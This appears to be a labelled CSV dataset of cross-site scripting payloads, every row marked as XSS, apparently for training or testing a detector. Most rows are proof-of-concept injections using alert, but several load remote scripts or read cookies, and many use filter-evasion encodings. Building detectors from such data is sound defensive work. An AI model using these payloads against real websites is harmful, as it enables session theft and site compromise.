payload,xss
<sup id=x tabindex=1 onfocusin=alert(1)></sup>,1
"<wbr onclick=""alert(1)"">AnonKryptiQuz</wbr>",1
"<main oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</main>",1
"<hr oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {color:red;}</style><image id=x style=""transition:color 1s"" ontransitionstart=alert(1)></image>",1
"<style>@keyframes slidein {}</style><input style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></input>",1
"<dl oncut=""alert(1)"" contenteditable>AnonKryptiQuz</dl>",1
<<SCRIPT>%(payload)s//<</SCRIPT>,1
"<style>@keyframes x{}</style><code style=""animation-name:x"" onwebkitanimationend=""alert(1)""></code>",1
"<rt draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</rt>",1
"<source id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></source>",1
"<keygen onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",1
"<content draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</content>",1
"<div draggable=""true"" contenteditable>drag me</div><object ondrop=alert(1) contenteditable style=display:block>drop here</object>",1
<var id=x tabindex=1 onactivate=alert(1)></var>,1
"<html xmlns=""http://www.w3.org/1999/xhtml"">",1
<script>%(payload)s</script>,1
"<figure onmouseup=""alert(1)"">AnonKryptiQuz</figure>",1
"?url=""onm<>ouseover=""ale<>rt(0)",1
"<time draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</time>",1
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>,1
<tfoot onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</tfoot>,1
"<body oncontextmenu=""alert(1)"">AnonKryptiQuz</body>",1
"<blockquote onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</blockquote>",1
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
"<thead onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></thead>",1
"<th onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</th>",1
<scr\uffffipt>alert(0)</script>,1
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;AnonKryptiQuz&lt;/A&gt;",1
"<div draggable=""true"" contenteditable>drag me</div><article ondragover=alert(1) contenteditable style=display:block>drop here</article>",1
"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",1
"<iframe onload iframe onload=""javascript:javascript:alert(1)""></iframe onload>",1
<svg><hr onload=alert(1)></hr>,1
"<image oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<style>:target {color:red;}</style><kbd id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></kbd>",1
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>",1
"<ul onmousemove=""alert(1)"">AnonKryptiQuz</ul>",1
"<div onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</div>",1
"<style>:target {transform: rotate(180deg);}</style><rb id=x style=""transition:transform 2s"" ontransitionrun=print()></rb>",1
<nextid onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</nextid><input value=clickme>,1
<title onmousewheel=alert(1) style=display:block>requires scrolling,1
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationstart=""alert(1)""></pre>",1
javascript:\\\\\\\/\\\\\\\/%250Aalert(1),1
"<iframe2 id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></iframe2>",1
%22%3C!--%3E%3CSvg%20OnLoad=confirm?.(/Yetixx%F0%9F%98%88/)%3C!--1%22%29%22%3C%21--%3E%3CSvg+OnLoad%3Dconfirm%3f%2e%28%2fYetixx%2f%29%3C%21--,1
"<style>:target {color:red;}</style><style id=x style=""transition:color 1s"" ontransitionend=alert(1)></style>",1
"<html onclick=""alert(1)"">AnonKryptiQuz</html>",1
"<s oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</s>",1
<caption onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</caption><input value=clickme>,1
"&lt;IMG SRC=\""javascript&#058;alert('AnonKryptiQuz');\""&gt;",1
"<style></style\x0D<img src=""about:blank"" onerror=javascript:alert(1)//></style>",1
"<style>@keyframes slidein {}</style><summary style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></summary>",1
"<listing oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<animate onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",1
<button popovertarget=x>Click me</button><image3 ontoggle=alert(1) popover id=x>AnonKryptiQuz</image3>,1
"<nobr oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</nobr>",1
<button popovertarget=x>Click me</button><style ontoggle=alert(1) popover id=x>AnonKryptiQuz</style>,1
<xmp id=x tabindex=1 onbeforedeactivate=alert(1)></xmp><input autofocus>,1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=""position:absolute;"" onanimationcancel=""print()""></marquee>",1
"<style>:target {color: red;}</style><image id=x style=""transition:color 10s"" ontransitioncancel=print()></image>",1
%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e,1
"<script>throw[onerror]=[alert],1</script>",1
"<image onmouseover=""alert(1)"">AnonKryptiQuz</image>",1
"<legend draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",1
<body onafterprint=alert(1)>,1
<form onpointermove=alert(1) style=display:block>AnonKryptiQuz</form>,1
<!-- Up to Opera 11.64 - see link below -->,1
"<style>:target {color:red;}</style><a id=x style=""transition:color 1s"" ontransitionend=alert(1)></a>",1
"<ruby oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</ruby>",1
"<bdo draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</bdo>",1
"<;A HREF="";http://66.102.7.147/"";>;XSS<;/A>;",1
"<form><input type=search onsearch=alert(1) value=""Hit return"" autofocus>",1
"javascript:""/*\""/*'/*--></title></textarea></style></noscript></template></noembed></script><<script>/*` /*<frame src=javascript:/**/alert()//><</script>",1
"<dfn draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",1
"<image onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</image>",1
<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>,1
<button popovertarget=x>Click me</button><command ontoggle=alert(1) popover id=x>AnonKryptiQuz</command>,1
"<main onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</main>",1
"<style>:target {color: red;}</style><figure id=x style=""transition:color 10s"" ontransitioncancel=print()></figure>",1
<table id=x tabindex=1 onactivate=alert(1)></table>,1
"<img2 ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</img2>",1
"<rp onmouseout=""alert(1)"">AnonKryptiQuz</rp>",1
"<table onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</table>",1
"<style>:target {color:red;}</style><strong id=x style=""transition:color 1s"" ontransitionend=alert(1)></strong>",1
"<head oncontextmenu=""alert(1)"">AnonKryptiQuz</head>",1
"<bdi onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></bdi>",1
<rp onpointerup=alert(1) style=display:block>AnonKryptiQuz</rp>,1
"<body onbeforeunload=""location='javascript:alert(1)'"">",1
"<style>@keyframes x{}</style><title style=""animation-name:x"" onanimationend=""alert(1)""></title>",1
"<style>@keyframes x{}</style><style style=""animation-name:x"" onanimationstart=""alert(1)""></style>",1
"<thead id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></thead>",1
"<abbr onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</abbr>",1
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&,1
<listing onmousewheel=alert(1) style=display:block>requires scrolling,1
"javascript:prompt(1)#{""action"":1}",1
"<bdo onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</bdo>",1
<label onbeforescriptexecute=alert(1)><script>1</script>,1
"<picture draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",1
</form>,1
<multicol id=x tabindex=1 ondeactivate=alert(1)></multicol><input id=y autofocus>,1
"<rt draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</rt>",1
"<h1 onmousedown=""alert(1)"">AnonKryptiQuz</h1>",1
"<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",1
"<div id=""42""><head><base href=""javascript://""/></head><body><a href=""/. /,alert(42)//#"">XXX</a></body>//[""'`-->]]>]</div>",1
"<listing onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",1
<nextid id=x tabindex=1 ondeactivate=alert(1)></nextid><input id=y autofocus>,1
"<marquee onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</marquee>",1
<h1 onfocus=alert(1) autofocus tabindex=1>,1
"<img src\x09=x onerror=""javascript:alert(1)"">",1
*{color:gre/**/en !/**/important} /* IE 6-9 Standards mode */,1
"<dfn onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></dfn>",1
"<select oncontextmenu=""alert(1)"">AnonKryptiQuz</select>",1
"<sub onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</sub>",1
<center onpointerover=alert(1) style=display:block>AnonKryptiQuz</center>,1
"<plaintext oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<!--[if<img src=x onerror=alert(2)//]> -->//[""'`-->]]>]</div>",1
"<IMG SRC=x oninput=""alert(String.fromCharCode(88,83,83))"">",1
<object onerror=alert(1) data=1 type=image/gif>,1
<blink onafterscriptexecute=alert(1)><script>1</script>,1
"<em draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</em>",1
<style id=x tabindex=1 ondeactivate=alert(1)></style><input id=y autofocus>,1
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onanimationend=""alert(1)""></audio>",1
"<ol onclick=""alert(1)"">AnonKryptiQuz</ol>",1
"<;IMG STYLE="";xss:expr/*XSS*/ession(alert(';XSS';))"";>;",1
"<image oncontextmenu=""alert(1)"">AnonKryptiQuz</image>",1
<head id=x tabindex=1 onfocus=alert(1)></head>,1
"<div draggable=""true"" contenteditable>drag me</div><sub ondrop=alert(1) contenteditable>drop here</sub>",1
"<ol oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</ol>",1
"<style>:target {color: red;}</style><em id=x style=""transition:color 10s"" ontransitioncancel=print()></em>",1
"<style>:target {color: red;}</style><sup id=x style=""transition:color 10s"" ontransitioncancel=print()></sup>",1
"<address draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</address>",1
&lt;SCRIPT&gt;a=/XSS/,1
"<dialog draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</dialog>",1
"""onx+%00+onpointerenter%3dalert(domain)+x""",1
"<figure onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</figure>",1
"<style>:target {color: red;}</style><form id=x style=""transition:color 10s"" ontransitioncancel=print()></form>",1
<data id=x tabindex=1 onbeforeactivate=alert(1)></data>,1
"<spacer draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</spacer>",1
"<iframe draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",1
"<bdi onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</bdi>",1
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""print()""></acronym>",1
<hr onmousewheel=alert(1) style=display:block>requires scrolling,1
"<picture draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</picture>",1
"<sub onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",1
"<tr onmouseout=""alert(1)"">AnonKryptiQuz</tr>",1
<kbd id=x tabindex=1 onbeforedeactivate=alert(1)></kbd><input autofocus>,1
<samp onfocusout=alert(1) tabindex=1 id=x></samp><input autofocus>,1
"<source ondblclick=""alert(1)"">AnonKryptiQuz</source>",1
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(1)"">DEF",1
<rt onbeforescriptexecute=alert(1)><script>1</script>,1
<;IMG SRC=JaVaScRiPt:alert(';XSS';)>;,1
"<style>@keyframes x{}</style><dt style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></dt>",1
"<style>:target {color:red;}</style><menuitem id=x style=""transition:color 1s"" ontransitionend=alert(1)></menuitem>",1
<h1 onafterscriptexecute=alert(1)><script>1</script>,1
<svg////////onload=alert(1)>,1
<svg onload=confirm(1),1
"<style>:target {color: red;}</style><span id=x style=""transition:color 10s"" ontransitioncancel=print()></span>",1
"<svg onmouseenter=""alert(1)"">AnonKryptiQuz</svg>",1
<button popovertarget=x>Click me</button><rt onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</rt>,1
”al”;b=”ert”;self[a+b]();,1
"<legend draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",1
"<style>:target {color:red;}</style><nobr id=x style=""transition:color 1s"" ontransitionend=alert(1)></nobr>",1
<script onpointerover=alert(1) style=display:block>AnonKryptiQuz</script>,1
"<style>@keyframes slidein {}</style><head style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></head>",1
"<tfoot onmouseover=""alert(1)"">AnonKryptiQuz</tfoot>",1
"<article onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</article>",1
"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e",1
"<body onmousedown=""alert(1)"">AnonKryptiQuz</body>",1
"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">",1
"<custom tags onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></custom tags>",1
'x'%20onclick='confirm`AnonKryptiQuz`',1
"<blockquote oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</blockquote>",1
<content onpointerup=alert(1) style=display:block>AnonKryptiQuz</content>,1
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=print()></ul>",1
"<style>@keyframes x{}</style><param style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></param>",1
#*/confirm(1),1
<p><img/src/onerror=alert(`AnonKryptiQuz`)></p>,1
"<frameset onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</frameset>",1
<a2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,1
"<datalist onmousemove=""alert(1)"">AnonKryptiQuz</datalist>",1
"<tfoot draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</tfoot>",1
"<a href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click Me</a>",1
"<figcaption onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",1
<svg onload=alert(1)>,1
"<strike onmouseenter=""alert(1)"">AnonKryptiQuz</strike>",1
<button popovertarget=x>Click me</button><p ontoggle=alert(1) popover id=x>AnonKryptiQuz</p>,1
<s onpointerover=alert(1) style=display:block>AnonKryptiQuz</s>,1
<template id=x tabindex=1 onactivate=alert(1)></template>,1
<img2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</img2><input value=clickme>,1
"<rp onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</rp>",1
"<output onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</output>",1
"<style>:target {color:red;}</style><dl id=x style=""transition:color 1s"" ontransitionend=alert(1)></dl>",1
"""><img src=x\%28\%29\ onerror=prompt(document.domain);>",1
"<form draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</form>",1
"</math>//[""'`-->]]>]</div>",1
<summary onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</summary><input value=clickme>,1
"<dialog oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",1
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",1
"<audio2 onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</audio2>",1
<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>,1
"<h1 onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</h1>",1
"<bdi onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</bdi>",1
<button popovertarget=x>Click me</button><div ontoggle=alert(1) popover id=x>AnonKryptiQuz</div>,1
"<bdi ondblclick=""alert(1)"">AnonKryptiQuz</bdi>",1
"<script SRC=""http://www.securitycompass.com/xss.jpg""></script>",1
<title id=x tabindex=1 onbeforedeactivate=alert(1)></title><input autofocus>,1
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",1
<image3 onpointerout=alert(1) style=display:block>AnonKryptiQuz</image3>,1
%22})))}catch(e){alert(document.domain);}//,1
"<wbr draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",1
"""jav&#x09;ascript:alert(1);"">",1
"<dd onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</dd>",1
<button popovertarget=x>Click me</button><frameset onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</frameset>,1
"<div id=""114""><x style=""background:url('x[a];color:red;/*')"">XXX</x>//[""'`-->]]>]</div>",1
"<strike onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></strike>",1
"&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;",1
"/*jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e*/</script>",1
"<IMG SRC=""javascript:alert('AnonKryptiQuz')""",1
"<big onmouseout=""alert(1)"">AnonKryptiQuz</big>",1
"jaVasCript:\/*-\/*`\/*\\`\/*\'\/*\""\/**\/(\/* *\/oNcliCk=alert() )\/\/%0D%0A%0D%0A\/\/<\/stYle\/<\/titLe\/<\/teXtarEa\/<\/scRipt\/--!>\\x3csVg\/<sVg\/oNloAd=alert()\/\/>\\x3e",1
<a onafterscriptexecute=alert(1)><script>1</script>,1
"<style>@keyframes x{}</style><footer style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></footer>",1
"<cite draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</cite>",1
"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable style=display:block>drop here</font>",1
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",1
"<li draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</li>",1
"<hr onmouseout=""alert(1)"">AnonKryptiQuz</hr>",1
"<td oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
"<iframe draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</iframe>",1
"<keygen oncut=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",1
"<iframe src=data:text/html,<iframe src=""data:text/html;base64,PD8+PD8+TT9MSz9KSyNAJDpMQCNKXkBePHNjcmlwdD5hbGVydCgnQml0QmFyZyA6KScpOzwvc2NyaXB0Pgo="">",1
"<div id=""92""><div style=""background:url(http://foo.f/f oo/;color:red/*/foo.jpg);"">X</div>//[""'`-->]]>]</div><div id=""93""><div style=""list-style:url(http://foo.f)\20url(javascript:alert(93));"">X</div>//[""'`-->]]>]</div>",1
<button popovertarget=x>Click me</button><datalist ontoggle=alert(1) popover id=x>AnonKryptiQuz</datalist>,1
"<map onmousemove=""alert(1)"">AnonKryptiQuz</map>",1
"<blink onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</blink>",1
/<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`AnonKryptiQuz`;>,1
"<blockquote oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
confirm?.(1),1
<del onpointerover=alert(1) style=display:block>AnonKryptiQuz</del>,1
"<s oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",1
<main onpointerover=alert(1) style=display:block>AnonKryptiQuz</main>,1
"<nobr draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</nobr>",1
<address id=x tabindex=1 onbeforeactivate=alert(1)></address>,1
"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('AnonKryptiQuz');\""&gt;",1
<datalist onpointerup=alert(1) style=display:block>AnonKryptiQuz</datalist>,1
"<b onmouseover=""alert(1)"">AnonKryptiQuz</b>",1
<strike id=x tabindex=1 ondeactivate=alert(1)></strike><input id=y autofocus>,1
<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,1
"<small ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</small>",1
constructor.constructor('alert(1)')(),1
&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;{()},1
"<style>@keyframes x{}</style><nav style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></nav>",1
"<ScRipT>alert(""AnonKryptiQuz"");</ScRipT>",1
"<style>@keyframes x{}</style><tr style=""animation-name:x"" onanimationend=""alert(1)""></tr>",1
%27%22()%26%25%3Cyes%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E,1
"<style>:target {color:red;}</style><title id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></title>",1
"<dd onclick=""alert(1)"">AnonKryptiQuz</dd>",1
<slot onpointerout=alert(1) style=display:block>AnonKryptiQuz</slot>,1
"<figure oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",1
"<div id=""117""><a href=""http://attacker.org"">",1
<datalist id=x tabindex=1 onbeforedeactivate=alert(1)></datalist><input autofocus>,1
<bdo onpointerup=alert(1) style=display:block>AnonKryptiQuz</bdo>,1
<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>,1
"<applet draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",1
<ol onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</ol><input value=clickme>,1
"<keygen onmouseleave=""alert(1)"">AnonKryptiQuz</keygen>",1
"<h1 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</h1>",1
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,1
"<style>:target {color:red;}</style><bdi id=x style=""transition:color 1s"" ontransitionend=alert(1)></bdi>",1
"<;IMG SRC="";jav&;#x09;ascript:alert(';XSS';);"";>;",1
<figure onpointerout=alert(1) style=display:block>AnonKryptiQuz</figure>,1
"<i oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</i>",1
<svg><hgroup onload=alert(1)></hgroup>,1
"<frameset onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</frameset>",1
"<i onmouseenter=""alert(1)"">AnonKryptiQuz</i>",1
"<body onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></body>",1
"<style>:target {transform: rotate(180deg);}</style><xss id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></xss>",1
<option onpointerdown=alert(1) style=display:block>AnonKryptiQuz</option>,1
'; alert(document.cookie); var foo=',1
"<samp draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</samp>",1
"<kbd draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</kbd>",1
"<hgroup onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</hgroup>",1
"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",1
"<details onclick=""alert(1)"">AnonKryptiQuz</details>",1
"javascript:alert()//--></title></style></noscript></noembed></template></select></textarea><frameset onload=alert()></script>*///\""//`//'//""//><svg <svg onload=alert()> alert()//",1
"ABC<div style=""x:\xE2\x80\x89expression(javascript:alert(1)"">DEF",1
"<cite draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</cite>",1
<datalist onafterscriptexecute=alert(1)><script>1</script>,1
-alert(23)/,1
"<abbr onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</abbr>",1
"<style>@keyframes x{}</style><listing style=""animation-name:x"" onanimationend=""alert(1)""></listing>",1
<sVg %00%00%00//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>,1
"<style>:target {color: red;}</style><rb id=x style=""transition:color 10s"" ontransitioncancel=print()></rb>",1
#<body onload=alert(“AnonKryptiQuz”)>,1
<svg/onload​=alert/&#42;&#42;/(4)>,1
<noembed onmousewheel=alert(1) style=display:block>requires scrolling,1
<nextid onafterscriptexecute=alert(1)><script>1</script>,1
<colgroup id=x tabindex=1 onbeforeactivate=alert(1)></colgroup>,1
"&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&gt;",1
"<abbr onmouseleave=""alert(1)"">AnonKryptiQuz</abbr>",1
